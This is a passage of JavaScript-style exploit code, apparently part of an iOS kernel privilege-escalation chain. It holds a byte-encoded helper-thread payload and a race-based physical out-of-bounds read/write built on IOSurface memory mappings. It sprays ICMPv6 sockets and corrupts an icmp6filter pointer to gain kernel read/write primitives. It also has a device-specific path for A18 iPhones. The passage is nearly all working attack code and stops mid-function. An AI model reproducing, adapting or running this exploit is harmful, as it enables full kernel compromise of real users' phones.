65, 108, 108, 111, 99, 97, 116, 101, 32, 97, 32, 110, 101, 119, 32, 110, 111, 110, 45, 99, 111, 110, 116, 105, 103, 117, 111, 117, 115, 32, 109, 97, 112, 32, 101, 110, 116, 114, 121, 32, 40, 111, 112, 116, 105, 111, 110, 97, 108, 108, 121, 32, 117, 115, 105, 110, 103, 32, 97, 32, 109, 101, 109, 111, 114, 121, 32, 111, 98, 106, 101, 99, 116, 41, 10, 32, 32, 32, 32, 32, 32, 32, 32, 107, 114, 32, 61, 32, 109, 97, 99, 104, 95, 118, 109, 95, 109, 97, 112, 40, 109, 97, 99, 104, 95, 116, 97, 115, 107, 95, 115, 101, 108, 102, 40, 41, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 103, 101, 116, 95, 98, 105, 103, 105, 110, 116, 95, 97, 100, 100, 114, 40, 102, 114, 101, 101, 95, 116, 97, 114, 103, 101, 116, 41, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 102, 114, 101, 101, 95, 116, 97, 114, 103, 101, 116, 95, 115, 105, 122, 101, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 48, 110, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 86, 77, 95, 70, 76, 65, 71, 83, 95, 70, 73, 88, 69, 68, 32, 124, 32, 86, 77, 95, 70, 76, 65, 71, 83, 95, 79, 86, 69, 82, 87, 82, 73, 84, 69, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 116, 97, 114, 103, 101, 116, 95, 111, 98, 106, 101, 99, 116, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 116, 97, 114, 103, 101, 116, 95, 111, 98, 106, 101, 99, 116, 95, 111, 102, 102, 115, 101, 116, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 48, 110, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 86, 77, 95, 80, 82, 79, 84, 95, 68, 69, 70, 65, 85, 76, 84, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 86, 77, 95, 80, 82, 79, 84, 95, 68, 69, 70, 65, 85, 76, 84, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 86, 77, 95, 73, 78, 72, 69, 82, 73, 84, 95, 78, 79, 78, 69, 41, 59, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 105, 102, 32, 40, 107, 114, 32, 33, 61, 32, 75, 69, 82, 78, 95, 83, 85, 67, 67, 69, 83, 83, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 76, 79, 71, 40, 34, 91, 45, 93, 32, 109, 97, 99, 104, 95, 118, 109, 95, 109, 97, 112, 32, 102, 97, 105, 108, 101, 100, 32, 33, 33, 33, 34, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 76, 79, 71, 40, 34, 91, 43, 93, 32, 102, 114, 101, 101, 95, 116, 97, 114, 103, 101, 116, 58, 32, 34, 32, 43, 32, 102, 114, 101, 101, 95, 116, 97, 114, 103, 101, 116, 46, 104, 101, 120, 40, 41, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 76, 79, 71, 40, 34, 91, 43, 93, 32, 116, 97, 114, 103, 101, 116, 95, 111, 98, 106, 101, 99, 116, 58, 32, 34, 32, 43, 32, 116, 97, 114, 103, 101, 116, 95, 111, 98, 106, 101, 99, 116, 46, 104, 101, 120, 40, 41, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 101, 120, 105, 116, 40, 48, 110, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 125, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 114, 97, 99, 101, 95, 115, 121, 110, 99, 95, 112, 116, 114, 44, 32, 48, 110, 41, 59, 10, 32, 32, 32, 32, 125, 10, 10, 32, 32, 32, 32, 47, 47, 32, 101, 110, 97, 98, 108, 101, 95, 103, 99, 40, 41, 59, 10, 125, 10, 10, 102, 114, 101, 101, 95, 116, 104, 114, 101, 97, 100, 40, 41, 59, 0]);
    let free_thread_js = 0n;
    if (free_thread_js == 0n) {
      free_thread_js = free_thread_js_data;
    }
    free_thread_jsthread = js_thread_spawn(free_thread_js, free_thread_arg);
  }
  let default_file_content = calloc(1n, target_file_size);
  memset_pattern8(default_file_content, get_bigint_addr(random_marker), target_file_size);
  function create_target_file(path) {
    let fd = fopen(path, get_cstring("w"));
    let written = fwrite(default_file_content, 1n, target_file_size, fd);
    fclose(fd);
  }
  function create_physically_contiguous_mapping(port, address, size) {
    let dict = CFDictionaryCreateMutable(kCFAllocatorDefault, 0n, kCFTypeDictionaryKeyCallBacks, kCFTypeDictionaryValueCallBacks);
    let cf_number = CFNumberCreate(kCFAllocatorDefault, 9n, get_bigint_addr(size));
    res = CFDictionarySetValue(dict, kIOSurfaceAllocSize, cf_number);
    let cfstring = create_cfstring(get_cstring("PurpleGfxMem"));
    res = CFDictionarySetValue(dict, create_cfstring(get_cstring("IOSurfaceMemoryRegion")), cfstring);
    let surface = IOSurfaceCreate(dict);
    CFRelease(dict);
    if (surface == 0n) {
      LOG("[-] Failed to create surface!!!");
      exit(0n);
    }
    let physical_mapping_address = IOSurfaceGetBaseAddress(surface);
    LOG("[+] physical_mapping_address: " + physical_mapping_address.hex());
    let memory_object = new_bigint();
    let kr = mach_make_memory_entry_64(mach_task_self(), get_bigint_addr(size), physical_mapping_address, VM_PROT_DEFAULT, get_bigint_addr(memory_object), 0n);
    if (kr != KERN_SUCCESS) {
      LOG("[-] mach_make_memory_entry_64 failed!!!");
      exit(0n);
    }
    let new_mapping_address = new_bigint();
    kr = mach_vm_map(mach_task_self(), get_bigint_addr(new_mapping_address), size, 0n, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR, memory_object, 0n, 0n, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
    if (kr != KERN_SUCCESS) {
      LOG("[-] mach_vm_map failed!!!");
      exit(0n);
    }
    CFRelease(surface);
    uwrite64(port, memory_object);
    uwrite64(address, new_mapping_address);
  }
  function initialize_physical_read_write(contiguous_mapping_size) {
    pc_size = contiguous_mapping_size;
    create_physically_contiguous_mapping(get_bigint_addr(pc_object), get_bigint_addr(pc_address), pc_size);
    LOG("[+] pc_object: " + pc_object.hex());
    LOG("[+] pc_address: " + pc_address.hex());
    memset_pattern8(pc_address, get_bigint_addr(random_marker), pc_size);
    free_target = pc_address;
    free_target_size = pc_size;
    uwrite64(free_target_sync_ptr, free_target);
    uwrite64(free_target_size_sync_ptr, free_target_size);
    uwrite64(free_thread_start_ptr, 1n);
    uwrite64(go_sync_ptr, 1n);
  }
  let iov = calloc(1n, 0x10n);
  let highiest_success_idx = 0n;
  let success_read_count = 0n;
  function physical_oob_read_mo(mo, mo_offset, size, offset, buffer) {
    uwrite64(target_object_sync_ptr, mo);
    uwrite64(target_object_offset_sync_ptr, mo_offset);
    uwrite64(iov + 0x00n, pc_address + 0x3f00n);
    uwrite64(iov + 0x08n, offset + size);
    uwrite64(buffer, random_marker);
    uwrite64(pc_address + 0x3f00n + offset, random_marker);
    let read_race_succeeded = false;
    let w = 0n;
    for (let try_idx = 0n; try_idx < highiest_success_idx + 100n; try_idx++) {
      uwrite64(race_sync_ptr, 1n);
      w = pwritev(read_fd, iov, 1n, 0x3f00n);
      cmp8_wait_for_change(race_sync_ptr, 1);
      kr = mach_vm_map(mach_task_self(), get_bigint_addr(pc_address), pc_size, 0n, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, pc_object, 0n, 0n, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
      if (kr != KERN_SUCCESS) {
        LOG("[-] mach_vm_map failed!!!");
        exit(0n);
      }
      if (w == 0xFFFFFFFFFFFFFFFFn) {
        let r = pread(read_fd, buffer, size, 0x3f00n + offset);
        let marker = uread64(buffer);
        if (marker != random_marker) {
          read_race_succeeded = true;
          success_read_count += 0x1n;
          if (try_idx > highiest_success_idx) {
            highiest_success_idx = try_idx;
          }
          break;
        } else {
          usleep(1n);
        }
      }
      if (try_idx == 500n) {
        break;
      }
    }
    uwrite64(target_object_sync_ptr, 0n);
    if (read_race_succeeded == false) {
      return 1n;
    }
    return KERN_SUCCESS;
  }
  function physical_oob_read_mo_with_retry(memory_object, seeking_offset, oob_size, oob_offset, read_buffer) {
    while (true) {
      kr = physical_oob_read_mo(memory_object, seeking_offset, oob_size, oob_offset, read_buffer);
      if (kr == KERN_SUCCESS) {
        break;
      }
    }
  }
  function physical_oob_write_mo(mo, mo_offset, size, offset, buffer) {
    uwrite64(target_object_sync_ptr, mo);
    uwrite64(target_object_offset_sync_ptr, mo_offset);
    uwrite64(iov + 0x00n, pc_address + 0x3f00n);
    uwrite64(iov + 0x08n, offset + size);
    pwrite(write_fd, buffer, size, 0x3f00n + offset);
    for (let try_idx = 0n; try_idx < 20n; try_idx++) {
      uwrite64(race_sync_ptr, 1n);
      preadv(write_fd, iov, 1n, 0x3f00n);
      cmp8_wait_for_change(race_sync_ptr, 1);
      kr = mach_vm_map(mach_task_self(), get_bigint_addr(pc_address), pc_size, 0n, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, pc_object, 0n, 0n, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
      if (kr != KERN_SUCCESS) {
        LOG("[-] mach_vm_map failed!!!");
        exit(0n);
      }
    }
    uwrite64(target_object_sync_ptr, 0n);
    return;
  }
  let control_socket = 0n;
  let rw_socket = 0n;
  let control_socket_pcb = 0n;
  let rw_socket_pcb = 0n;
  let EARLY_KRW_LENGTH = 0x20n;
  let control_data = calloc(1n, EARLY_KRW_LENGTH);
  function set_target_kaddr(where) {
    memset(control_data, 0n, EARLY_KRW_LENGTH);
    uwrite64(control_data, where);
    let res = setsockopt(control_socket, IPPROTO_ICMPV6, ICMP6_FILTER, control_data, EARLY_KRW_LENGTH);
    if (res != 0n) {
      LOG("[-] setsockopt failed!!!");
      exit(0n);
    }
  }
  function early_kread(where, read_buf, size) {
    if (size > EARLY_KRW_LENGTH) {
      LOG("[!] error: (size > EARLY_KRW_LENGTH)");
      exit(0n);
    }
    set_target_kaddr(where);
    let read_data_length = BigInt(size);
    res = getsockopt(rw_socket, IPPROTO_ICMPV6, ICMP6_FILTER, read_buf, get_bigint_addr(read_data_length));
    if (res != 0n) {
      LOG("[-] getsockopt failed!!!");
      exit(0n);
    }
  }
  function early_kread64(where) {
    let value = new_bigint();
    let res = early_kread(where, get_bigint_addr(value), 0x8n);
    return update_bigint(value);
  }
  function early_kwrite32bytes(where, write_buf) {
    set_target_kaddr(where);
    let res = setsockopt(rw_socket, IPPROTO_ICMPV6, ICMP6_FILTER, write_buf, EARLY_KRW_LENGTH);
    if (res != 0n) {
      LOG("[-] setsockopt failed!!!");
      exit(0n);
    }
  }
  let early_kwrite64_write_buf = calloc(1n, EARLY_KRW_LENGTH);
  function early_kwrite64(where, what) {
    early_kread(where, early_kwrite64_write_buf, EARLY_KRW_LENGTH);
    uwrite64(early_kwrite64_write_buf, what);
    early_kwrite32bytes(where, early_kwrite64_write_buf);
  }
  function kread_length(address, buffer, size) {
    let remaining = BigInt(size);
    let read_offset = 0n;
    let read_size = 0n;
    while (remaining != 0n) {
      if (remaining >= EARLY_KRW_LENGTH) {
        read_size = EARLY_KRW_LENGTH;
      } else {
        read_size = remaining % EARLY_KRW_LENGTH;
      }
      early_kread(address + read_offset, buffer + read_offset, read_size);
      remaining -= read_size;
      read_offset += read_size;
    }
  }
  let kwrite_length_buffer = calloc(1n, EARLY_KRW_LENGTH);
  function kwrite_length(dst, src, size) {
    let remaining = BigInt(size);
    let write_offset = 0n;
    let write_size = 0n;
    while (remaining != 0n) {
      if (remaining >= EARLY_KRW_LENGTH) {
        write_size = EARLY_KRW_LENGTH;
      } else {
        write_size = remaining % EARLY_KRW_LENGTH;
      }
      let kwrite_dst_addr = dst + write_offset;
      let kwrite_src_addr = src + write_offset;
      if (write_size != EARLY_KRW_LENGTH) {
        kread_length(kwrite_dst_addr, kwrite_length_buffer, EARLY_KRW_LENGTH);
      }
      memcpy(kwrite_length_buffer, kwrite_src_addr, write_size);
      early_kwrite32bytes(kwrite_dst_addr, kwrite_length_buffer);
      remaining -= write_size;
      write_offset += write_size;
    }
  }
  function kwrite_zone_element(dst, src, len) {
    let CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE = 0x20n;
    if (len < CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE) {
      LOG("kwrite_zone_element supports only zone element size >= 0x20");
      return false;
    }
    let write_size = 0n;
    let write_offset = 0n;
    let remaining = BigInt(len);
    while (remaining != 0n) {
      write_size = remaining >= CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE ? CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE : remaining % CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE;
      let kwrite_dst_addr = dst + write_offset;
      let kwrite_src_addr = src + write_offset;
      if (write_size != CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE) {
        let adjust = CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE - write_size;
        kwrite_dst_addr -= adjust;
        kwrite_src_addr -= adjust;
      }
      kwrite_length(kwrite_dst_addr, kwrite_src_addr, CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE);
      remaining -= write_size;
      write_offset += write_size;
    }
    return true;
  }
  function kdump(where, size, msg = "") {
    LOG(`[+] ----------- ${msg} ----------`);
    for (let i = 0n; i < size; i += 0x10n) {
      LOG(`[+] [${i.hex()}] ${(where + i).hex()}:\t${early_kread64(where + i).hex()} ${early_kread64(where + i + 8n).hex()}`);
    }
  }
  function krw_sockets_leak_forever() {
    let offset_pcb_socket = 0x40n;
    let offset_socket_so_count = 0x254n;
    let control_socket_addr = early_kread64(control_socket_pcb + offset_pcb_socket);
    let rw_socket_addr = early_kread64(rw_socket_pcb + offset_pcb_socket);
    if (control_socket_addr == 0n || rw_socket_addr == 0n) {
      LOG("[-] Couldn't find control_socket_addr || rw_socket_addr");
      exit(0n);
    }
    let control_socket_so_count = early_kread64(control_socket_addr + offset_socket_so_count);
    let rw_socket_so_count = early_kread64(rw_socket_addr + offset_socket_so_count);
    early_kwrite64(control_socket_addr + offset_socket_so_count, control_socket_so_count + 0x0000100100001001n);
    early_kwrite64(rw_socket_addr + offset_socket_so_count, rw_socket_so_count + 0x0000100100001001n);
    let icmp6filt_offset = 0x148n;
    early_kwrite64(rw_socket_pcb + icmp6filt_offset + 0x8n, 0n);
  }
  let socket_ports = [];
  let socket_pcb_ids = [];
  let socket_ports_count = 0n;
  let getsockopt_read_length = 32n;
  let getsockopt_read_data = calloc(1n, getsockopt_read_length);
  let socket_info = calloc(1n, 0x400n);
  function spray_socket(socket_ports, socket_pcb_ids) {
    let fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
    if (fd == 0xFFFFFFFFFFFFFFFFn) {
      LOG("[-] socket create failed!!!");
      return fd;
    }
    let output_socket_port = new_bigint();
    fileport_makeport(fd, get_bigint_addr(output_socket_port));
    close(fd);
    let r = syscall(336n, 6n, getpid(), 3n, output_socket_port, socket_info, 0x400n);
    let inp_gencnt = uread64(socket_info + 0x110n);
    socket_ports.push(output_socket_port);
    socket_pcb_ids.push(inp_gencnt);
    return output_socket_port;
  }
  function sockets_release() {
    for (let sock_idx = 0n; sock_idx < socket_ports_count; sock_idx++) {
      let port = socket_ports.pop();
      mach_port_deallocate(mach_task_self(), port);
      socket_pcb_ids.pop();
    }
    socket_ports_count = 0n;
  }
  function create_surface_with_address(address, size) {
    let properties = CFDictionaryCreateMutable(kCFAllocatorDefault, 0n, kCFTypeDictionaryKeyCallBacks, kCFTypeDictionaryValueCallBacks);
    let address_ptr = new_uint64_t(address);
    let address_number = CFNumberCreate(kCFAllocatorDefault, 11n, address_ptr);
    CFDictionarySetValue(properties, create_cfstring(get_cstring("IOSurfaceAddress")), address_number);
    let size_ptr = new_uint64_t(size);
    let size_number = CFNumberCreate(kCFAllocatorDefault, 9n, size_ptr);
    CFDictionarySetValue(properties, create_cfstring(get_cstring("IOSurfaceAllocSize")), size_number);
    let surface = IOSurfaceCreate(properties);
    IOSurfacePrefetchPages(surface);
    free(address_ptr);
    free(size_ptr);
    CFRelease(address_number);
    CFRelease(size_number);
    CFRelease(properties);
    return surface;
  }
  let mlock_dict = {};
  function surface_mlock(address, size) {
    let surf = create_surface_with_address(address, size);
    mlock_dict[address] = surf;
  }
  function surface_munlock(address, size) {
    if (mlock_dict[address] != undefined) {
      CFRelease(mlock_dict[address]);
    }
    mlock_dict[address] = undefined;
  }
  function find_and_corrupt_socket(memory_object, seeking_offset, read_buffer, write_buffer, target_inp_gencnt_list, do_read = true) {
    if (do_read == true) {
      physical_oob_read_mo_with_retry(memory_object, seeking_offset, oob_size, oob_offset, read_buffer);
    }
    let search_start_idx = 0n;
    let target_found = false;
    let pcb_start_offset = 0n;
    let icmp6filt_offset = 0x148n;
    let found = 0n;
    do {
      found = memmem(read_buffer + search_start_idx, oob_size - search_start_idx, executable_name, strlen(executable_name));
      if (found != 0n) {
        pcb_start_offset = found - read_buffer & 0xFFFFFFFFFFFFFC00n;
        if (uread64(read_buffer + pcb_start_offset + icmp6filt_offset + 0x8n) == 0x0000ffffffffffffn) {
          target_found = true;
          break;
        }
      }
      search_start_idx += 0x400n;
    } while (found != 0n && search_start_idx < oob_size);
    if (target_found == true) {
      LOG("[+] pcb_start_offset: " + pcb_start_offset.hex());
      let target_inp_gencnt = uread64(read_buffer + pcb_start_offset + 0x78n);
      LOG("[+] target_inp_gencnt: " + target_inp_gencnt.hex());
      if (target_inp_gencnt == socket_pcb_ids[socket_ports_count - 1n]) {
        LOG(`[-] Found last PCB`);
        return -1n;
      }
      let is_our_pcb = false;
      let control_socket_idx = undefined;
      for (let sock_idx = 0n; sock_idx < socket_ports_count; sock_idx++) {
        if (socket_pcb_ids[sock_idx] == target_inp_gencnt) {
          is_our_pcb = true;
          control_socket_idx = sock_idx;
          break;
        }
      }
      if (is_our_pcb == false) {
        LOG(`[-] Found freed PCB Page!`);
        return -1n;
      }
      if (target_inp_gencnt_list.includes(target_inp_gencnt)) {
        LOG(`[-] Found old PCB Page!!!!`);
        return -1n;
      } else {
        target_inp_gencnt_list.push(target_inp_gencnt);
      }
      let inp_list_next_pointer = uread64(read_buffer + pcb_start_offset + 0x28n) - 0x20n;
      let icmp6filter = uread64(read_buffer + pcb_start_offset + icmp6filt_offset);
      LOG("[+] inp_list_next_pointer: " + inp_list_next_pointer.hex());
      LOG("[+] icmp6filter: " + icmp6filter.hex());
      rw_socket_pcb = BigInt(inp_list_next_pointer);
      memcpy(write_buffer, read_buffer, oob_size);
      uwrite64(write_buffer + pcb_start_offset + icmp6filt_offset, inp_list_next_pointer + icmp6filt_offset);
      uwrite64(write_buffer + pcb_start_offset + icmp6filt_offset + 0x8n, 0n);
      LOG("[+] Corrupting icmp6filter pointer...");
      while (true) {
        physical_oob_write_mo(memory_object, seeking_offset, oob_size, oob_offset, write_buffer);
        physical_oob_read_mo_with_retry(memory_object, seeking_offset, oob_size, oob_offset, read_buffer);
        let new_icmp6filter = uread64(read_buffer + pcb_start_offset + icmp6filt_offset);
        if (new_icmp6filter == inp_list_next_pointer + icmp6filt_offset) {
          LOG("[+] target corrupted: " + uread64(read_buffer + pcb_start_offset + icmp6filt_offset).hex());
          break;
        }
      }
      let sock = fileport_makefd(socket_ports[control_socket_idx]);
      let res = getsockopt(sock, IPPROTO_ICMPV6, ICMP6_FILTER, getsockopt_read_data, get_bigint_addr(getsockopt_read_length));
      if (res != 0n) {
        LOG("[-] getsockopt failed!!!");
        exit(0n);
      }
      let marker = uread64(getsockopt_read_data);
      if (marker != 0xffffffffffffffffn) {
        LOG("[+] Found control_socket at idx: " + control_socket_idx.hex());
        control_socket = sock;
        rw_socket = fileport_makefd(socket_ports[control_socket_idx + 0x1n]);
        return KERN_SUCCESS;
      } else {
        LOG("[-] Failed to corrupt control_socket at idx: " + control_socket_idx.hex());
      }
    }
    return -1n;
  }
  let kernel_base = 0n;
  let kernel_slide = 0n;
  let is_a18_devices = false;
  function pe_v1() {
    let n_of_total_search_mapping_pages = 0x1000n * 0x10n;
    if (is_a18_devices) {
      n_of_total_search_mapping_pages = 0x10n * 0x10n;
    }
    let search_mapping_size = 0x2000n * PAGE_SIZE;
    if (is_a18_devices) {
      search_mapping_size = 0x10n * PAGE_SIZE;
    }
    let total_search_mapping_size = n_of_total_search_mapping_pages * PAGE_SIZE;
    let n_of_search_mappings = total_search_mapping_size / search_mapping_size;
    let read_buffer = calloc(1n, oob_size);
    let write_buffer = calloc(1n, oob_size);
    initialize_physical_read_write(n_of_oob_pages * PAGE_SIZE);
    let wired_mapping = new_bigint();
    let wired_mapping_size = 1024n * 1024n * 1024n * 3n;
    if (is_a18_devices) {
      kr = mach_vm_allocate(mach_task_self(), get_bigint_addr(wired_mapping), wired_mapping_size, VM_FLAGS_ANYWHERE);
      LOG(`[+] wired_mapping: ${wired_mapping.hex()}`);
    }
    let target_inp_gencnt_list = [];
    while (true) {
      if (is_a18_devices) {
        surface_mlock(wired_mapping, wired_mapping_size);
        for (let s = 0n; s < wired_mapping_size / 0x4000n; s++) {
          uwrite64(wired_mapping + s * 0x4000n, 0n);
        }
      }
      let search_mappings = [];
      for (let s = 0n; s < n_of_search_mappings; s++) {
        let search_mapping_address = new_bigint();
        kr = mach_vm_allocate(mach_task_self(), get_bigint_addr(search_mapping_address), search_mapping_size, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
        if (kr != KERN_SUCCESS) {
          LOG("[-] mach_vm_allocate failed!!!");
          exit(0n);
        }
        for (let k = 0n; k < search_mapping_size; k += PAGE_SIZE) {
          uwrite64(search_mapping_address + k, random_marker);
        }
        search_mappings.push(search_mapping_address);
      }
      socket_ports = [];
      socket_pcb_ids = [];
      socket_ports_count = 0n;
      const OPEN_MAX = 10240n;
      let maxfiles = 3n * OPEN_MAX;
      let leeway = 4096n * 2n;
      for (let socket_count = 0n; socket_count < maxfiles - leeway; socket_count++) {
        let port = spray_socket(socket_ports, socket_pcb_ids);
        if (port == 0xFFFFFFFFFFFFFFFFn) {
          LOG("[-] Failed to spray sockets: " + socket_ports_count.hex());
          break;
        } else {
          socket_ports_count++;
        }
      }
      let start_pcb_id = socket_pcb_ids[0];
      let end_pcb_id = socket_pcb_ids[socket_ports_count - 1n];
      LOG(`[i] socket_ports_count: ${socket_ports_count.hex()}`);
      LOG(`[i] start_pcb_id: ${start_pcb_id.hex()}`);
      LOG(`[i] end_pcb_id: ${end_pcb_id.hex()}`);
      let success = false;
      for (let s = 0n; s < n_of_search_mappings; s++) {
        let search_mapping_address = search_mappings[s];
        LOG("[i] looking in search mapping: " + s);
        let memory_object = new_bigint();
        let memory_object_size = BigInt(search_mapping_size);
        kr = mach_make_memory_entry_64(mach_task_self(), get_bigint_addr(memory_object_size), search_mapping_address, VM_PROT_DEFAULT, get_bigint_addr(memory_object), 0n);
        if (kr != 0n) {
          LOG("[-] mach_make_memory_entry_64 failed!!!");
          exit(0n);
        }
        surface_mlock(search_mapping_address, search_mapping_size);
        let seeking_offset = 0n;
        while (seeking_offset < search_mapping_size) {
          kr = physical_oob_read_mo(memory_object, seeking_offset, oob_size, oob_offset, read_buffer);
          if (kr == KERN_SUCCESS) {
            if (find_and_corrupt_socket(memory_object, seeking_offset, read_buffer, write_buffer, target_inp_gencnt_list, false) == KERN_SUCCESS) {
              success = true;
              break;
            }
          }
          seeking_offset += PAGE_SIZE;
        }
        kr = mach_port_deallocate(mach_task_self(), memory_object);
        if (kr != KERN_SUCCESS) {
          LOG("[-] mach_port_deallocate failed!!!");
          exit(0n);
        }
        if (success == true) {
          break;
        }
      }
      sockets_release();
      for (let s = 0n; s < n_of_search_mappings; s++) {
        let search_mapping_address = search_mappings.pop();
        kr = mach_vm_deallocate(mach_task_self(), search_mapping_address, search_mapping_size);
      }
      if (is_a18_devices) {
        surface_munlock(wired_mapping, wired_mapping_size);
      }
      if (success == true) {
        break;
      }
    }
  }
  function pe_v2() {
    let read_buffer = calloc(1n, oob_size);
    let write_buffer = calloc(1n, oob_size);
    initialize_physical_read_write(n_of_oob_pages * PAGE_SIZE);
    let getsockopt_read_length = 32n;
    let getsockopt_read_data = calloc(1n, getsockopt_read_length);
    let wired_mapping_entry_size = PAGE_SIZE;
    let wired_mapping_entries_total_size = 1024n * 1024n * 1024n * 2n;
    let n_of_wired_mapping_entries = wired_mapping_entries_total_size / wired_mapping_entry_size;
    let wired_mapping_entries_addresses = [];
    LOG("[i] Allocating memory");
    let kr = KERN_SUCCESS;
    let wired_address = 0n;
    for (let i = 0n; i < n_of_wired_mapping_entries; i++) {
      if (i == 0n) {
        wired_address = new_bigint();
        do {
          kr = mach_vm_allocate(mach_task_self(), get_bigint_addr(wired_address), wired_mapping_entry_size, VM_FLAGS_ANYWHERE);
        } while (kr != KERN_SUCCESS);
      } else {
        wired_address = BigInt(wired_mapping_entries_addresses.slice(-1));
        do {
          wired_address += wired_mapping_entry_size;
          kr = mach_vm_allocate(mach_task_self(), get_bigint_addr(wired_address), wired_mapping_entry_size, VM_FLAGS_FIXED);
        } while (kr != KERN_SUCCESS);
      }
      wired_mapping_entries_addresses.push(wired_address);
      surface_mlock(wired_address, wired_mapping_entry_size);
      uwrite64(wired_address, wired_page_marker);
      uwrite64(wired_address + 0x8n, wired_address);
    }
    let target_inp_gencnt_list = [];
    LOG("[i] Allocating memory done");
    while (true) {
      let search_mapping_size = 0x800n * PAGE_SIZE;
      let search_mapping_address = new_bigint();
      kr = mach_vm_allocate(mach_task_self(), get_bigint_addr(search_mapping_address), search_mapping_size, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
      if (kr != KERN_SUCCESS) {
        LOG("[-] mach_vm_allocate failed!!!");
        exit(0n);
      }
      for (let k = 0n; k < search_mapping_size; k += PAGE_SIZE) {
        uwrite64(search_mapping_address + k, random_marker);
      }
      surface_mlock(search_mapping_address, search_mapping_size);
      let memory_object = new_bigint();
      let memory_object_size = BigInt(search_mapping_size);
      kr = mach_make_memory_entry_64(mach_task_self(), get_bigint_addr(memory_object_size), search_mapping_address, VM_PROT_DEFAULT, get_bigint_addr(memory_object), 0n);
      if (kr != 0n) {
        LOG("[-] mach_make_memory_entry_64 failed!!!");
        exit(0n);
      }
      socket_ports = [];
      socket_pcb_ids = [];
      socket_ports_count = 0n;
      let max_sockets_count = 0x5800n;
      let split_count = 8n;
      let wired_pages = [];
      let success = false;
      let seeking_offset = 0n;
      while (seeking_offset < search_mapping_size) {
        kr = physical_oob_read_mo(memory_object, seeking_offset, oob_size, oob_offset, read_buffer);
        if (kr != KERN_SUCCESS) {
          seeking_offset += PAGE_SIZE;
          continue;
        }
        if (uread64(read_buffer) == wired_page_marker) {
          let wired_page = uread64(read_buffer + 0x8n);
          LOG(`[i] seeking_offset: ${seeking_offset.hex()}: Found wired_page: ${wired_page.hex()}`);
          if (wired_pages.indexOf(wired_page) == -1) {
            wired_pages.push(wired_page);
            let idx = wired_mapping_entries_addresses.indexOf(wired_page);
            wired_mapping_entries_addresses.splice(idx, 1);
            uwrite64(wired_page, 0n);
            uwrite64(wired_page + 0x8n, 0n);
          } else {
            LOG(`[-] Found old wired page!!!!`);
            seeking_offset += PAGE_SIZE;
            continue;
          }
          kr = mach_vm_deallocate(mach_task_self(), wired_page, wired_mapping_entry_size);
          if (kr != KERN_SUCCESS) {
            LOG(`[-] Failed to deallocate wired page!!!!`);
          }
          for (let socket_count = 0n; socket_count < max_sockets_count / split_count; socket_count++) {
            let port = spray_socket(socket_ports, socket_pcb_ids);
            if (port == 0xFFFFFFFFFFFFFFFFn) {
              LOG("[-] Failed to spray sockets: " + socket_ports_count.hex());
              break;
            } else {
              socket_ports_count++;
            }
          }
          if (find_and_corrupt_socket(memory_object, seeking_offset, read_buffer, write_buffer, target_inp_gencnt_list, true) == KERN_SUCCESS) {
            LOG(`[i] seeking_offset: ${seeking_offset.hex()}: Reallocated PCB page`);
            success = true;
            break;
          } else {
            if (socket_ports_count >= max_sockets_count) {
              sockets_release();
              LOG("[+] waiting for zone trimming...");
              sleep(20n);
            }
            seeking_offset = 0n;
          }
        } else if (find_and_corrupt_socket(memory_object, seeking_offset, read_buffer, write_buffer, target_inp_gencnt_list, false) == KERN_SUCCESS) {
          LOG(`[i] seeking_offset: ${seeking_offset.hex()}: Found PCB page`);
          success = true;
          break;
        } else {
          seeking_offset += PAGE_SIZE;
        }
      }
      kr = mach_port_deallocate(mach_task_self(), memory_object);
      if (kr != KERN_SUCCESS) {
        LOG("[-] mach_port_deallocate failed!!!");
        exit(0n);
      }
      sockets_release();
      kr = mach_vm_deallocate(mach_task_self(), search_mapping_address, search_mapping_size);
      if (success == true) {
        break;
      }
    }
    for (let i = 0n; i < BigInt(wired_mapping_entries_addresses.length); i++) {
      let wired_page = wired_mapping_entries_addresses[i];
      mach_vm_deallocate(mach_task_self(), wired_page, wired_mapping_entry_size);
    }
  }
  function pe() {
    let device_machine = get_device_machine();
    if (strstr(device_machine, get_cstring("iPhone17,")) != 0n) {
      LOG("[+] Running on A18 Devices");
      is_a18_devices = true;
      sleep(8n);
      pe_init();
      pe_v2();
    } else {
